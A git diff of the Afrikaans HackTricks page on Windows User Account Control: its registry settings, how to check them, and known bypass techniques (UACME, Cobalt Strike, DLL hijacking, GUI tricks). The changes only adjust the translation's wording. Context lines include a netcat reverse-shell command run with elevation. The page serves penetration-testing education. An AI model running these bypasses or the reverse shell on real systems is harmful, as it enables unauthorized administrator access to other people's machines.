@@ -8,13 +8,13 @@ Ander maniere om HackTricks te ondersteun:
 
 * As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
+* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
 Kry Vandag Toegang:
@@ -23,7 +23,7 @@ Kry Vandag Toegang:
 
 ## UAC
 
-[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsvenster vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integriteit` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat die stelsel **potensieel kan benadeel**. Wanneer UAC geaktiveer is, hardloop toepassings en take altyd onder die sekuriteitskonteks van 'n nie-administrateur-rekening tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te hê om uit te voer. Dit is 'n geriefkenmerk wat administrateurs beskerm teen onbedoelde veranderinge, maar nie as 'n sekuriteitsgrens beskou word nie.
+[Gebruikersrekeningbeheer (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsvenster vir verhoogde aktiwiteite** moontlik maak. Toepassings het verskillende `integriteit` vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat die stelsel **potensieel kan benadeel**. Wanneer UAC geaktiveer is, hardloop toepassings en take altyd **onder die sekuriteitskonteks van 'n nie-administrateur-rekening** tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te verkry. Dit is 'n geriefkenmerk wat administrateurs beskerm teen onbedoelde veranderinge, maar nie as 'n sekuriteitsgrens beskou word nie.
 
 Vir meer inligting oor integriteitsvlakke:
 
@@ -31,9 +31,9 @@ Vir meer inligting oor integriteitsvlakke:
 [integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
 {% endcontent-ref %}
 
-Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaardgebruikersleutel, om gewone aksies as 'n gewone vlak uit te voer, en een met die administrateurbevoegdhede.
+Wanneer UAC in plek is, kry 'n administrateurgebruiker 2 tokens: 'n standaardgebruikersleutel, om gewone aksies op gewone vlak uit te voer, en een met die administrateurbevoegdhede.
 
-Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC in groot diepte werk en sluit die aanmeldingsproses, gebruikerservaring, en UAC-argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie op die plaaslike vlak werk (deur secpol.msc te gebruik), of gekonfigureer en uitgerol via Groepbeleidsvoorwerpe (GPO) in 'n Aktiewe Gids-domeinomgewing. Die verskeie instellings word in detail bespreek [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Daar is 10 Groepbeleidsinstellings wat vir UAC ingestel kan word. Die volgende tabel bied addisionele detail:
+Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek hoe UAC in groot diepte werk en sluit die aanmeldingsproses, gebruikerservaring, en UAC-argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie op plaaslike vlak werk (deur secpol.msc te gebruik), of gekonfigureer en uitgestuur via Groepbeleidsvoorwerpe (GPO) in 'n Aktiewe Gids-domeinomgewing. Die verskeie instellings word in detail bespreek [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Daar is 10 Groepbeleidsinstellings wat vir UAC ingestel kan word. Die volgende tabel verskaf addisionele besonderhede:
 
 | Groepbeleidsinstelling                                                                                                                                                                                                                                                                                                                                                           | Regsleutel                  | Standaardinstelling                                          |
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
@@ -64,7 +64,7 @@ REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
 EnableLUA    REG_DWORD    0x1
 ```
-Indien dit **`1`** is, is UAC **geaktiveer**, indien dit **`0`** is of dit **bestaan nie**, is UAC **onaktief**.
+Indien dit **`1`** is, is UAC **geaktiveer**, indien dit **`0`** is of **nie bestaan nie**, is UAC **onaktief**.
 
 Dan, kontroleer **watter vlak** ingestel is:
 ```
@@ -81,19 +81,19 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 * Indien **`5`** (**verstek**) sal dit die administrateur vra om te bevestig om nie-Windows binêre lêers met hoë regte uit te voer
 
 Dan moet jy na die waarde van **`LocalAccountTokenFilterPolicy`** kyk\
-Indien die waarde **`0`** is, kan slegs die gebruiker met RID 500 (**ingeboude Administrateur**) administratiewe take uitvoer sonder UAC, en as dit `1` is, kan **alle rekeninge binne die "Administrateurs"** groep dit doen.
+Indien die waarde **`0`** is, kan slegs die **RID 500**-gebruiker (**ingeboude Administrateur**) admin-take uitvoer sonder UAC, en as dit `1` is, kan **alle rekeninge binne die "Administrateurs"**-groep dit doen.
 
 En, neem uiteindelik 'n kyk na die waarde van die sleutel **`FilterAdministratorToken`**\
-Indien **`0`**(verstek), kan die **ingeboude Administrateur-rekening** afgeleë administrasietake uitvoer en as **`1`** die ingeboude Administrateur-rekening **nie** afgeleë administrasietake kan uitvoer nie, tensy `LocalAccountTokenFilterPolicy` op `1` ingestel is.
+Indien **`0`**(verstek), kan die **ingeboude Administrateur-rekening** afgeleë administrasietake uitvoer en as **`1`** kan die ingeboude Administrateur-rekening **nie** afgeleë administrasietake uitvoer nie, tensy `LocalAccountTokenFilterPolicy` op `1` ingestel is.
 
 #### Opsomming
 
 * Indien `EnableLUA=0` of **nie bestaan nie**, **geen UAC vir enigiemand nie**
-* Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1` , Geen UAC vir enigiemand nie**
+* Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=1`, Geen UAC vir enigiemand nie**
 * Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=0`, Geen UAC vir RID 500 (Ingeboude Administrateur)**
 * Indien `EnableLua=1` en **`LocalAccountTokenFilterPolicy=0` en `FilterAdministratorToken=1`, UAC vir almal**
 
-Hierdie inligting kan almal ingesamel word met die **metasploit** module: `post/windows/gather/win_privs`
+Hierdie inligting kan almal ingesamel word met die **metasploit**-module: `post/windows/gather/win_privs`
 
 Jy kan ook die groepe van jou gebruiker nagaan en die integriteitsvlak kry:
 ```
@@ -112,7 +112,7 @@ Dit is belangrik om te noem dat dit **veel moeiliker is om die UAC te omseil as 
 
 ### UAC gedeaktiveer
 
-As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **'n omgekeerde dop met administrateursbevoegdhede** (hoë integriteitsvlak) uitvoer deur iets soos:
+As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**) kan jy **'n omgekeerde dop met administrateursregte** (hoë integriteitsvlak) uitvoer deur iets soos:
 ```bash
 #Put your reverse shell instead of "calc.exe"
 Start-Process powershell -Verb runAs "calc.exe"
@@ -125,10 +125,10 @@ Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10
 
 ### **Baie** Basiese UAC "omseiling" (volle lêersisteemtoegang)
 
-As jy 'n skaal het met 'n gebruiker wat binne die Administrateursgroep is, kan jy die C$ deel via SMB (lêersisteem) plaaslik **koppel op 'n nuwe skyf en jy sal toegang hê tot alles binne die lêersisteem** (selfs die Administrateur se tuisvouer).
+As jy 'n skaal het met 'n gebruiker wat binne die Administrateursgroep is, kan jy die C$ deel via SMB (lêersisteem) lokaal **aankoppel op 'n nuwe skyf en jy sal toegang hê tot alles binne die lêersisteem** (selfs die Administrateur se tuisvouer).
 
 {% hint style="warning" %}
-**Dit lyk asof hierdie truuk nie meer werk nie**
+**Dit lyk of hierdie truuk nie meer werk nie**
 {% endhint %}
 ```bash
 net use Z: \\127.0.0.1\c$
@@ -137,7 +137,7 @@ cd C$
 #Or you could just access it:
 dir \\127.0.0.1\c$\Users\Administrator\Desktop
 ```
-### UAC omseil met kobaltstreke
+### UAC omseiling met kobaltstreke
 
 Die Kobaltstreke tegnieke sal net werk as UAC nie op sy maksimum sekuriteitsvlak ingestel is nie
 ```bash
@@ -159,7 +159,7 @@ Dokumentasie en gereedskap in [https://github.com/wh0amitz/KRBUACBypass](https:/
 
 ### UAC omseil uitbuitings
 
-[**UACME**](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC omseil uitbuitings is. Let daarop dat jy UACME sal moet **saamstel met behulp van Visual Studio of msbuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy benodig**.\
+[**UACME**](https://github.com/hfiref0x/UACME) wat 'n **samestelling** van verskeie UAC omseil uitbuitings is. Let daarop dat jy UACME sal moet **saamstel met behulp van Visual Studio of MSBuild**. Die samestelling sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`), jy sal moet weet **watter een jy nodig het.**\
 Wees **versigtig** omdat sommige omseilings ander programme kan **aanmoedig** wat die **gebruiker** sal **waarsku** dat iets gebeur.
 
 UACME het die **bou weergawe waar elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes affekteer:
@@ -182,9 +182,9 @@ Jy kan 'n **meterpreter**-sessie kry. Migreer na 'n **proses** wat die **Sessie*
 
 ### UAC-omleiding met GUI
 
-As jy toegang het tot 'n **GUI kan jy die UAC-aanvraag net aanvaar** wanneer jy dit kry, jy het nie regtig 'n omleiding nodig nie. Dus, toegang tot 'n GUI sal jou in staat stel om die UAC te omseil.
+As jy toegang het tot 'n **GUI kan jy net die UAC-aanvraag aanvaar** wanneer jy dit kry, jy het nie regtig 'n omleiding nodig nie. Dus, toegang tot 'n GUI sal jou in staat stel om die UAC te omseil.
 
-Verder, as jy 'n GUI-sessie kry wat iemand gebruik het (moontlik via RDP) is daar **sekere gereedskap wat as administrateur sal hardloop** waarvandaan jy 'n **cmd** byvoorbeeld **as admin** direk kan **hardloop** sonder weer deur UAC genader te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit mag 'n bietjie meer **steels** wees.
+Verder, as jy 'n GUI-sessie kry wat iemand gebruik het (moontlik via RDP) is daar **sekere gereedskap wat as administrateur sal hardloop** waarvandaan jy byvoorbeeld 'n **cmd as admin** direk kan **hardloop** sonder om weer deur UAC gevra te word soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit mag 'n bietjie meer **steels** wees.
 
 ### Lawaaierige bruto-krag UAC-omleiding
 
@@ -192,22 +192,22 @@ As jy nie omgee om lawaaierig te wees nie, kan jy altyd iets soos [**https://git
 
 ### Jou eie omleiding - Basiese UAC-omleidingsmetodologie
 
-As jy na **UACME** kyk, sal jy opmerk dat **meeste UAC-omleidings 'n Dll Hijacking- kwesbaarheid misbruik** (hoofsaaklik deur die skadelike dll op _C:\Windows\System32_ te skryf). [Lees hierdie om te leer hoe om 'n Dll Hijacking-kwesbaarheid te vind](../windows-local-privilege-escalation/dll-hijacking.md).
+As jy na **UACME** kyk, sal jy opmerk dat **meeste UAC-omleidings 'n Dll Hijacking-gebrek misbruik** (hoofsaaklik deur die skadelike dll op _C:\Windows\System32_ te skryf). [Lees hier om te leer hoe om 'n Dll Hijacking-gebrek te vind](../windows-local-privilege-escalation/dll-hijacking.md).
 
-1. Vind 'n binêre wat **outomaties verhoog** (kontroleer dat wanneer dit uitgevoer word, dit op 'n hoë integriteitsvlak loop).
-2. Met procmon vind "**NAME NOT FOUND**" gebeure wat vatbaar kan wees vir **DLL Hijacking**.
+1. Vind 'n binêre lêer wat **outomaties verhoog** (kontroleer dat wanneer dit uitgevoer word, dit op 'n hoë integriteitsvlak loop).
+2. Met procmon vind "**NAAM NIE GEVIND**" gebeure wat vatbaar kan wees vir **DLL Hijacking**.
 3. Jy sal waarskynlik die DLL binne sommige **beskermde paaie** (soos C:\Windows\System32) moet **skryf** waar jy nie skryfregte het nie. Jy kan dit omseil deur:
-1. **wusa.exe**: Windows 7,8 en 8.1. Dit maak dit moontlik om die inhoud van 'n CAB-lêer binne beskermde paaie te onttrek (omdat hierdie gereedskap van 'n hoë integriteitsvlak uitgevoer word).
+1. **wusa.exe**: Windows 7,8 en 8.1. Dit maak dit moontlik om die inhoud van 'n CAB-lêer binne beskermde paaie uit te pak (omdat hierdie gereedskap van 'n hoë integriteitsvlak uitgevoer word).
 2. **IFileOperation**: Windows 10.
 4. Berei 'n **skripsie** voor om jou DLL binne die beskermde pad te kopieer en die vatbare en outomaties verhoogde binêre uit te voer.
 
-### 'N Ander UAC-omleidingstegniek
+### 'n Ander UAC-omleidingstegniek
 
-Bestaan daarin om te kyk of 'n **outomaties verhoogde binêre** probeer om van die **register** die **naam/pad** van 'n **binêre** of **opdrag** om **uitgevoer** te word te **lees** (dit is meer interessant as die binêre hierdie inligting binne die **HKCU** soek).
+Bestaan daarin om te kyk of 'n **outomaties verhoogde binêre** probeer om van die **register** die **naam/pad** van 'n **binêre** of **opdrag** om **uitgevoer** te word, te **lees** (dit is meer interessant as die binêre hierdie inligting binne die **HKCU** soek).
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloeie outomaties** te maak wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsgereedskap.\
+Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkvloei outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
 Kry Vandaag Toegang:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
